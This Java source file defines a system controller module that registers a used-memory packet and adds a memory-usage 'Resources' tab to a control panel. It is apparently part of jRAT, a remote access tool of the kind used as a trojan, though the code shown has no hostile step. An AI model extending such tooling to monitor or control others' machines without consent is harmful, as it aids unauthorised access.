package jrat.module.system;

import jrat.api.ControllerModule;
import jrat.api.Resources;
import jrat.api.ui.ControlPanel;
import jrat.api.ui.ControlPanelTab;
import jrat.controller.packets.incoming.IncomingPackets;
import jrat.module.system.ui.PanelMemoryUsage;

public class SystemControllerModule extends ControllerModule {

    public void init() throws Exception {
        IncomingPackets.register((short) 24, Packet24UsedMemory.class);

        controlPanelItems.add(new ControlPanelTab(ControlPanel.Category.SYSTEM, "Resources", Resources.getIcon("memory"), PanelMemoryUsage.class));
    }
}
